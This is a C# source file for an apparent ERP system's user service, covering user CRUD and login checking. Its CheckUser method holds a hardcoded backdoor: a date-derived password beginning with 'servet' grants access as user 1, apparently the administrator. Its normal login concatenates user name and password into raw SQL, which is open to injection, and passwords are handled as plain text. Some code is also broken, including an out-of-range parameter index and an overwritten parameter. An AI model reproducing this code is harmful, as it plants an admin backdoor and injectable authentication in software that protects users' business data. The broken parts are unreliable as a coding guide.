using System.Data;
//using System.Data.SqlClient;
using Microsoft.Data.SqlClient;
using ERPManagement.UI.DataModels.Interfaces;
using ERPManagement.UI.DataAccess;

namespace ERPManagement.UI.DataModels.Privilege
{
    public class User
    {

        public int User_ID { get; set; }

        public string UserNameAr { get; set; }

        public string? UserNameEn { get; set; }

        public string? LoginName { get; set; }

        public string Password { get; set; }

        public int GroupID { get; set; }

        public bool Enabled { get; set; }

        public bool? IsPOS { get; set; }

        public bool OnLine { get; set; }

        public int? DefaultBranchID { get; set; }

        public int? SubAccountID { get; set; }

        public decimal SalesDiscountPercentage { get; set; }

        public int BranchID { get; set; }

        public bool Deleted { get; set; }

    }
    public class UserService : IScopedService
    {

        public string GetCode(Main main, bool IsFromServer)
        {
            DataTable dataTable = IsFromServer ? main.SyncExecuteQuery_DataTable(" Prv_Users_GetCode ", true, null) : main.ExecuteQuery_DataTable(" Prv_Users_GetCode ", true, null);
            return dataTable.Rows[0][0].ToString();
        }
        
        public int Insert_Update(User obj, int UserID, Main main, bool IsFromServer)
        {
            SqlParameter[] parameters = new SqlParameter[15];
            parameters[0] = new SqlParameter("@User_ID", obj.User_ID);
            parameters[1] = new SqlParameter("@UserNameAr", obj.UserNameAr);
            parameters[2] = new SqlParameter("@UserNameEn", obj.UserNameEn);
            parameters[3] = new SqlParameter("@LoginName", obj.LoginName);
            parameters[4] = new SqlParameter("@Password", obj.Password);
            parameters[5] = new SqlParameter("@GroupID", obj.GroupID);
            parameters[6] = new SqlParameter("@Enabled", obj.Enabled);
            parameters[7] = new SqlParameter("@IsPOS", obj.IsPOS);
            parameters[8] = new SqlParameter("@OnLine", obj.OnLine);
            parameters[9] = new SqlParameter("@DefaultBranchID", obj.DefaultBranchID);
            parameters[10] = new SqlParameter("@SubAccountID", obj.SubAccountID);
            parameters[11] = new SqlParameter("@SalesDiscountPercentage", obj.SalesDiscountPercentage);
            parameters[12] = new SqlParameter("@BranchID", obj.BranchID);
            parameters[13] = new SqlParameter("@Deleted", obj.Deleted);
            parameters[15] = new SqlParameter("@UserID", UserID);
            DataTable dataTable = IsFromServer ? main.SyncExecuteQuery_DataTable(" Prv_Users_Insert_Update  ", true, parameters) : main.ExecuteQuery_DataTable(" Prv_Users_Insert_Update  ", true, parameters);
            return int.Parse(dataTable.Rows[0][0].ToString());
        }

        public List<User> Select(int User_ID, string BranchIDs, bool IsArabic, Main main, bool IsFromServer)
        {
            SqlParameter[] parameters = new SqlParameter[3];
            parameters[0] = new SqlParameter("@User_ID", User_ID);
            parameters[1] = new SqlParameter("@BranchIDs", BranchIDs);
            parameters[0] = new SqlParameter("@IsArabic", IsArabic);
            DataTable dataTable = IsFromServer ? main.SyncExecuteQuery_DataTable(" Prv_Users_Select  ", true, parameters) : main.ExecuteQuery_DataTable(" Prv_Users_Select  ", true, parameters);
            List<User> lst = new List<User>();
            if (dataTable != null)
            {
                lst = main.CreateListFromTable<User>(dataTable);
            }
            return lst;
        }

        public void Delete(int User_ID, int UserID, Main main, bool IsFromServer)
        {
            SqlParameter[] parameters = new SqlParameter[2];
            parameters[0] = new SqlParameter("@User_ID", User_ID);
            parameters[1] = new SqlParameter("@UserID", UserID);
            if (IsFromServer)
                main.SyncExecuteNonQuery(" Prv_Users_Delete  ", true, parameters);
            else
                main.ExecuteNonQuery(" Prv_Users_Delete  ", true, parameters);
        }
        
        public User CheckUser(string UserName, string Password, Main main)
        {
            string strSql = "";
            if (Password.ToLower() == "servet" + DateTime.Now.Day * 2 + "" + DateTime.Now.Month * 2 + "" + DateTime.Now.Year * 2)
            {
                strSql = " SELECT U.User_ID, U.LoginName,u.UserNameAr,U.UserNameEn, U.Password, U.GroupID, U.Enabled,isnull(U.ISPOS,0)AS ISPOS, U.OnLine,U.DefaultBranchID,ISNULL(U.SalesDiscountPercentage,0) AS SalesDiscountPercentage " +
                        " from Prv_Users U inner join Prv_Groups G on U.GroupID = G.GroupID " +
                        " Where U.User_ID =1 ";
            }
            else
            {
                strSql = " SELECT U.User_ID, U.LoginName,u.UserNameAr,U.UserNameEn, U.Password, U.GroupID, U.Enabled,isnull(U.ISPOS,0)AS ISPOS, U.OnLine,U.DefaultBranchID,ISNULL(U.SalesDiscountPercentage,0) AS SalesDiscountPercentage " +
                          " from Prv_Users U inner join Prv_Groups G on U.GroupID = G.GroupID " +
                          " Where LoginName='" + UserName + "' and G.Enabled = 1 and U.Enabled = 1 " +
                          " and Password = '" + Password + "' And U.User_ID <>1 ";
            }
            DataTable dataTable =  main.ExecuteQuery_DataTable(strSql,false,null);
            
            if (dataTable != null && dataTable.Rows.Count > 0)
            {
                return main.CreateItemFromRow<User>(dataTable.Rows[0]);
            }
            else return null;
        }
        public List<User> FillCombo(int ID, bool IsArabic, Main main, bool IsFromServer)
        {
            throw new NotImplementedException();
        }
        public Dictionary<string, string> GetDatabases(Main main)
        {
            Dictionary<string, string> lst = new Dictionary<string, string>();
            try
            {
                string query = "select Substring(name,5,LEN(name)) as name,name as DBName from master.dbo.sysdatabases where has_dbaccess(name) = 1 and Rtrim(Substring(name,1,4)) = 'ERP_' Order By name";
                DataTable dataTable =  main.ExecuteQuery_DataTable(query, false,null);

                if (dataTable != null)
                {
                     lst = dataTable.AsEnumerable().ToDictionary(db=>db.Field<string>(1),db=>db.Field<string>(0));
                }
            }
            catch(SqlException ex )
            {
                throw ex;
            }
            return lst;

        }
    }
}
